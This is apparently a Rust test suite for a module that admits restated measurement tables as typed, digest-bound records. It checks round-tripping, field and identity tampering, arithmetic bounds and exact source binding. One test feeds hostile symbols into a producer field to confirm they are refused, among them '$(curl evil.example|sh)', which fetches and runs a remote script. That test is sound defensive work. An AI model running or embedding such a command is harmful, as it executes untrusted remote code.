// SPDX-License-Identifier: MPL-2.0
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

use sim_kernel::{Datum, Symbol};

use super::*;

fn source() -> Vec<u8> {
    "# Selected round\n\nintro text\n\n\
| Retained SUP20 measure | Observed value |\n\
| --- | ---: |\n\
| Materialized schedule truth | 269 of 270 |\n\
| Plan revisions | 230 |\n\
| Closeout epochs | 42: 37 failed, 4 invalidated, 1 interrupted/running raw state |\n\
| Proof leaves in the terminal graph | 280: 60 generate, 183 standalone, 10 workspace, 27 package |\n\
| Lifecycle event rows | 458,386 |\n\
| Telemetry spans | 103,261, of which 103,213 finished |\n\
| Sum of overlapping span durations | 563.33 hours |\n\
| `unit.ready.carried` events | 188,393 |\n\
| `focused.check.receipt.carried` events | 134,616 |\n\
| Previous fixed point before retirement | 280 green leaves |\n\
| Last raw epoch after revision | 26 green, 1 interrupted, 253 pending |\n\
| Reused receipts in that last epoch | 2 |\n\n\
The corpus is valuable because it contains controlled contrasts, not because\n\
the successor should imitate its storage or scheduling model.\n\n\
### E1 - semantic identity must be declared, and must be narrow\n\n\
A control-only repair retained 213 of 280 proof receipts. A change to three\n\
public heads and their pins retained only one. Cache identity was too broad and\n\
proof invalidation had no single accountable projection. Every conclusion must\n\
name the exact semantic facts on which it depends and explain every reuse and\n\
invalidation.\n"
        .as_bytes()
        .to_vec()
}

fn commission() -> TrustedCommission {
    TrustedCommission {
        producer: Symbol::qualified("authoring", "producer"),
        authority: Symbol::qualified("authoring", "commission"),
        review: Symbol::qualified("authoring", "review-name-only"),
    }
}

fn authored() -> NeutralQualificationInput {
    NeutralQualificationInput::author_restated(&source(), &commission()).unwrap()
}

fn gap(result: Result<NeutralQualificationInput>) -> NeutralInputGap {
    result.expect_err("must be refused").gap
}

fn edit(datum: &Datum, path: &[&str], f: &dyn Fn(Datum) -> Datum) -> Datum {
    let Datum::Node { tag, fields } = datum else {
        panic!("node")
    };
    let mut fields = fields.clone();
    let idx = fields
        .iter()
        .position(|(n, _)| &*n.name == path[0])
        .expect("field");
    fields[idx].1 = if path.len() == 1 {
        f(fields[idx].1.clone())
    } else {
        edit(&fields[idx].1, &path[1..], f)
    };
    Datum::Node {
        tag: tag.clone(),
        fields,
    }
}

fn drop_field(datum: &Datum, path: &[&str], name: &str) -> Datum {
    let Datum::Node { tag, fields } = datum else {
        panic!("node")
    };
    if path.is_empty() {
        return Datum::Node {
            tag: tag.clone(),
            fields: fields
                .iter()
                .filter(|(n, _)| &*n.name != name)
                .cloned()
                .collect(),
        };
    }
    edit(datum, &path[..1], &|d| drop_field(&d, &path[1..], name))
}

fn add_field(datum: &Datum, path: &[&str], name: &str, value: Datum) -> Datum {
    if path.is_empty() {
        let Datum::Node { tag, fields } = datum else {
            panic!("node")
        };
        let mut fields = fields.clone();
        fields.push((Symbol::new(name), value));
        return Datum::Node {
            tag: tag.clone(),
            fields,
        };
    }
    edit(datum, &path[..1], &|d| {
        add_field(&d, &path[1..], name, value.clone())
    })
}

fn u64d(n: u64) -> Datum {
    Datum::Number(sim_kernel::NumberLiteral {
        domain: Symbol::qualified("qualification", "u64"),
        canonical: n.to_string(),
    })
}

#[test]
fn restated_table_round_trips_and_keeps_every_table_fact() {
    let input = authored();
    let datum = input.to_datum().unwrap();
    let decoded = NeutralQualificationInput::from_datum(&datum).unwrap();
    assert_eq!(decoded, input);
    decoded
        .verify_restated_measurements(&source(), &commission())
        .unwrap();
    let f = &decoded.facts;
    assert_eq!((f.scheduled, f.materialized, f.revisions), (270, 269, 230));
    assert_eq!(f.overlapping_span_milliseconds, 2_027_988_000);
    assert_eq!(
        (
            f.last_frontier.green,
            f.last_frontier.interrupted,
            f.last_frontier.pending,
            f.last_frontier.total
        ),
        (26, 1, 253, 280)
    );
    let reuse: Vec<_> = f
        .contrast_reuse
        .iter()
        .map(|r| (r.contrast, r.retained, r.denominator))
        .collect();
    assert_eq!(
        reuse,
        vec![
            (ReuseContrast::ControlOnlyRepair, 213, 280),
            (ReuseContrast::PublicHeadAndPinChange, 1, 280),
            (ReuseContrast::LastRawEpoch, 2, 280),
            (ReuseContrast::PreviousFixedPoint, 280, 280),
        ]
    );
}

#[test]
fn encoding_is_deterministic_and_ids_are_self_exclusive() {
    let a = authored().to_datum().unwrap();
    let b = authored().to_datum().unwrap();
    assert_eq!(a, b);
    let input = authored();
    assert_ne!(input.facts.id().unwrap(), input.selected_source);
}

#[test]
fn shape_refuses_extra_missing_text_tag_and_version() {
    let d = authored().to_datum().unwrap();
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&add_field(
            &d,
            &["facts"],
            "invented",
            u64d(1)
        ))),
        NeutralInputGap::ExtraField
    );
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&add_field(
            &d,
            &["facts", "last-frontier"],
            "previous-fixed-point-green",
            u64d(280)
        ))),
        NeutralInputGap::ExtraField
    );
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&drop_field(
            &d,
            &["facts"],
            "revisions"
        ))),
        NeutralInputGap::MissingField
    );
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&add_field(
            &d,
            &[],
            "note",
            Datum::String("a path /etc".into())
        ))),
        NeutralInputGap::ForbiddenText
    );
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&edit(
            &d,
            &["version"],
            &|_| u64d(2)
        ))),
        NeutralInputGap::UnsupportedVersion
    );
    let retagged = match &d {
        Datum::Node { fields, .. } => Datum::Node {
            tag: Symbol::qualified("qualification", "neutral-input-v2"),
            fields: fields.clone(),
        },
        _ => unreachable!(),
    };
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&retagged)),
        NeutralInputGap::UnrecognizedTag
    );
    let unregistered = edit(&d, &["facts", "contrast-reuse"], &|v| {
        let Datum::Vector(mut items) = v else {
            panic!()
        };
        items[0] = edit(&items[0], &["contrast"], &|_| {
            Datum::Symbol(Symbol::qualified("qualification", "invented-contrast"))
        });
        Datum::Vector(items)
    });
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&unregistered)),
        NeutralInputGap::UnrecognizedTag
    );
}

#[test]
fn bounds_and_identities_each_fail_for_their_own_reason() {
    let base = authored();
    for (mutate, expected) in [
        (
            Box::new(|f: &mut NeutralFacts| f.materialized = f.scheduled + 1)
                as Box<dyn Fn(&mut NeutralFacts)>,
            NeutralInputGap::Arithmetic,
        ),
        (
            Box::new(|f| f.epochs.failed += 1),
            NeutralInputGap::Arithmetic,
        ),
        (
            Box::new(|f| f.proof_classes.package += 1),
            NeutralInputGap::Arithmetic,
        ),
        (
            Box::new(|f| f.spans.finished = f.spans.total + 1),
            NeutralInputGap::Arithmetic,
        ),
        (
            Box::new(|f| f.last_frontier.pending += 1),
            NeutralInputGap::Arithmetic,
        ),
        (
            Box::new(|f| f.contrast_reuse[0].retained = f.contrast_reuse[0].denominator + 1),
            NeutralInputGap::Arithmetic,
        ),
        (
            Box::new(|f| f.contrast_reuse.push(f.contrast_reuse[0])),
            NeutralInputGap::Arithmetic,
        ),
    ] {
        let mut input = base.clone();
        mutate(&mut input.facts);
        let datum = input.to_datum().unwrap();
        assert_eq!(gap(NeutralQualificationInput::from_datum(&datum)), expected);
    }
}

#[test]
fn ids_are_recomputed_not_trusted() {
    let d = authored().to_datum().unwrap();
    let bad_digest = |d: Datum| edit(&d, &["digest"], &|_| Datum::Bytes(vec![7; 32]));
    let facts_id_tampered = edit(&d, &["facts", "id"], &bad_digest);
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&facts_id_tampered)),
        NeutralInputGap::Identity
    );
    let receipt_id_tampered = edit(&d, &["derivation", "id"], &bad_digest);
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&receipt_id_tampered)),
        NeutralInputGap::Identity
    );
    let source_tampered = edit(&d, &["selected-source"], &bad_digest);
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&source_tampered)),
        NeutralInputGap::Identity
    );
}

#[test]
fn runtime_consumption_must_be_declared_absent() {
    let d = authored().to_datum().unwrap();
    let flipped = edit(&d, &["derivation", "no-runtime-consumption"], &|_| {
        Datum::Bool(false)
    });
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&flipped)),
        NeutralInputGap::Arithmetic
    );
}

#[test]
fn source_binding_is_exact_bytes_and_exact_table() {
    let decoded = NeutralQualificationInput::from_datum(&authored().to_datum().unwrap()).unwrap();
    let mut other = source();
    other.push(b'\n');
    assert_eq!(
        decoded
            .verify_restated_measurements(&other, &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::SourceMismatch
    );
    let changed = String::from_utf8(source())
        .unwrap()
        .replace("| Plan revisions | 230 |", "| Plan revisions | 231 |");
    let reauthored =
        NeutralQualificationInput::author_restated(changed.as_bytes(), &commission()).unwrap();
    // A slot authored for another source never verifies against this one.
    assert_eq!(
        reauthored
            .verify_restated_measurements(&source(), &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::SourceMismatch
    );
    // Facts that disagree with the table, under a correct source identity, are refused.
    let mut lying = decoded.clone();
    lying.facts.revisions += 1;
    assert_eq!(
        lying
            .verify_restated_measurements(&source(), &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::FactMismatch
    );
    // Table digest that is not the exact region is refused.
    let mut wrong_region = decoded;
    wrong_region.derivation.source_digests[1].digest = [9; 32];
    assert_eq!(
        wrong_region
            .verify_restated_measurements(&source(), &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::SourceMismatch
    );
}

#[test]
fn table_rows_are_required_unique_and_well_formed() {
    let s = String::from_utf8(source()).unwrap();
    for (from, to) in [
        ("| Plan revisions | 230 |\n", ""),
        ("| Reused receipts in that last epoch | 2 |\n", ""),
        (
            "| Previous fixed point before retirement | 280 green leaves |\n",
            "",
        ),
        (
            "| Plan revisions | 230 |\n",
            "| Plan revisions | 230 |\n| Plan revisions | 230 |\n",
        ),
        ("563.33 hours", "563.3 hours"),
        ("retained only one.", "retained none."),
    ] {
        let mutated = s.replace(from, to);
        assert_eq!(
            RestatedMeasurements::from_source(mutated.as_bytes())
                .unwrap_err()
                .gap,
            NeutralInputGap::FactMismatch,
            "{from:?}"
        );
    }
}

#[test]
fn size_bound_is_enforced() {
    assert!(NeutralQualificationInput::check_encoded_size(MAX_NEUTRAL_INPUT_BYTES).is_ok());
    assert_eq!(
        NeutralQualificationInput::check_encoded_size(MAX_NEUTRAL_INPUT_BYTES + 1)
            .unwrap_err()
            .gap,
        NeutralInputGap::Oversize
    );
}

fn sym_datum(ns: &str, name: &str) -> Datum {
    Datum::Symbol(Symbol::qualified(ns, name))
}

#[test]
fn free_form_symbols_cannot_smuggle_text_or_invent_a_review() {
    let d = authored().to_datum().unwrap();
    for hostile in [
        sym_datum("https://evil.example", "run"),
        sym_datum("authoring", "$(curl evil.example|sh)"),
        sym_datum("authoring", "PASS"),
        sym_datum("authoring", ""),
        sym_datum("other", "producer"),
    ] {
        let tampered = edit(&d, &["derivation", "producer"], &|_| hostile.clone());
        assert_eq!(
            gap(NeutralQualificationInput::from_datum(&tampered)),
            NeutralInputGap::ForbiddenText
        );
    }
}

#[test]
fn content_ids_must_use_the_registered_algorithm() {
    let d = authored().to_datum().unwrap();
    let wrong = edit(&d, &["selected-source", "algorithm"], &|_| {
        sym_datum("core", "sha256")
    });
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&wrong)),
        NeutralInputGap::UnrecognizedTag
    );
}

#[test]
fn admission_binds_the_trusted_commission_procedure_and_precision() {
    let good = authored();
    let mut other = commission();
    other.review = Symbol::qualified("authoring", "another-review");
    assert_eq!(
        good.verify_restated_measurements(&source(), &other)
            .unwrap_err()
            .gap,
        NeutralInputGap::Identity
    );
    let mut procedure = good.clone();
    procedure.derivation.procedure = Datum::Node {
        tag: Symbol::qualified("qualification", "other"),
        fields: vec![],
    }
    .content_id()
    .unwrap();
    assert_eq!(
        procedure
            .verify_restated_measurements(&source(), &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::Identity
    );
    let mut precision = good.clone();
    precision.derivation.precision.source_decimal_places = 99;
    let round_trip = NeutralQualificationInput::from_datum(&precision.to_datum().unwrap()).unwrap();
    assert_eq!(
        round_trip
            .verify_restated_measurements(&source(), &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::FactMismatch
    );
    let mut roles = good.clone();
    roles.derivation.source_digests.reverse();
    assert_eq!(
        roles
            .verify_restated_measurements(&source(), &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::SourceMismatch
    );
    let mut duplicated = good;
    duplicated.derivation.source_digests[1] = duplicated.derivation.source_digests[0];
    assert_eq!(
        duplicated
            .verify_restated_measurements(&source(), &commission())
            .unwrap_err()
            .gap,
        NeutralInputGap::SourceMismatch
    );
}

#[test]
fn contrast_sentences_are_bound_to_their_subject_and_population() {
    let s = String::from_utf8(source()).unwrap();
    for (from, to) in [
        (
            "A change to three\npublic heads and their pins retained only one.",
            "An unrelated actor retained only one.",
        ),
        (
            "retained 213 of 280 proof receipts",
            "retained 213 of 281 proof receipts",
        ),
        (
            "retained 213 of 280 proof receipts",
            "retained 213 proof receipts",
        ),
        (
            "A control-only repair retained 213 of 280 proof receipts.",
            "A control-only repair retained 213 of 280 proof receipts. A control-only repair retained 1 of 280 proof receipts.",
        ),
    ] {
        let mutated = s.replace(from, to);
        assert_ne!(mutated, s, "{from:?}");
        assert_eq!(
            RestatedMeasurements::from_source(mutated.as_bytes())
                .unwrap_err()
                .gap,
            NeutralInputGap::FactMismatch,
            "{from:?}"
        );
    }
}

#[test]
fn overflowing_source_rows_are_a_named_gap_not_a_panic() {
    let s = String::from_utf8(source()).unwrap().replace(
        "26 green, 1 interrupted, 253 pending",
        "18,446,744,073,709,551,615 green, 1 interrupted, 0 pending",
    );
    let result = std::panic::catch_unwind(|| RestatedMeasurements::from_source(s.as_bytes()));
    assert_eq!(
        result.expect("must not panic").unwrap_err().gap,
        NeutralInputGap::Arithmetic
    );
}

#[test]
fn previous_fixed_point_is_its_own_all_green_population() {
    let mut input = authored();
    let r = input
        .facts
        .contrast_reuse
        .iter_mut()
        .find(|r| r.contrast == ReuseContrast::PreviousFixedPoint)
        .unwrap();
    r.denominator += 1;
    let d = input.to_datum().unwrap();
    assert_eq!(
        gap(NeutralQualificationInput::from_datum(&d)),
        NeutralInputGap::Arithmetic
    );
}

mod admission;
mod decode_guards;
mod oracle_guards;
mod regions;
mod row_guards;
